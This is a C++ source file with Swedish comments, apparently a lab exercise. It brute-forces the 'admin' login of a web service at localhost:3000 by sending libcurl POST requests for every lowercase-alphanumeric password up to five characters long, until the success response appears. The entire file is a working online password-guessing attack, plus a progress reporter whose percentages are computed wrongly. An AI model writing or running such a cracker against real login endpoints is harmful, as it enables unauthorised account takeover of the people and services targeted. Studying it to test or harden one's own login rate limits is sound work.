#include <iostream>
#include <string>
#include <curl/curl.h>
#include <cmath>
#include <thread>
#include <chrono>

using namespace std;



// Callback-funktion för att hantera svaret
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

string sendAndReciveHTTP(string username, string password)
{
    CURL* curl;
    CURLcode res;
    string response;

    // JSON payload
    string json_payload = "{\"username\":\"" + username + "\", \"password\":\"" + password + "\"}";

    string output = "fail";

    curl = curl_easy_init();
    if (curl)
    {
        // Sätt URL
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/login");

        // Sätt till POST
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        // Sätt JSON payload
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, json_payload.length());

        // Sätt headers (inklusive Content-Type)
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Sätt callback-funktion
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Utför förfrågan
        res = curl_easy_perform(curl);

        // Kontrollera för fel
        if (res != CURLE_OK)
        {
            
        }
        else
        {
            output = response;
        }

        // Städa upp headers
        curl_slist_free_all(headers);

        // Städa upp curl
        curl_easy_cleanup(curl);
    }
    return output;
}

void progressTimer(double* pointer, double total)
{
    while (true)
    {
        this_thread::sleep_for(chrono::seconds(5)); // vänta 10 sekunder

        double percentage = (*pointer / total) * 100.0;
        cout << "[Progress] " << percentage << "% Done" << endl;
    }
}

void gen(string allowedChars, int length, string password, double* pointer)
{
    for (char character : allowedChars)
    {
        if (password.length() == length - 1)
        {
            string response = sendAndReciveHTTP("admin", password + character);

            *pointer = *pointer + 1;

            if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
            {
                cout << "The correct password is: " << password << character;
                exit(0);
            }
        }
        else
        {
            gen(allowedChars, length, password + character, pointer);
        }
    }
}

void doBruteForceToMaxLength(int maxLength)
{
    double passwordTry = 0;

    string allowedChars = "abcdefghijklmnopqrstuvwxyz0123456789";

    thread timerThread(progressTimer, &passwordTry, maxLength);

    for (int i = 0; i < maxLength; i++)
    {
        gen(allowedChars, i + 1, "", &passwordTry);
    }

}



int main()
{

    doBruteForceToMaxLength(5);

    return 0;
}

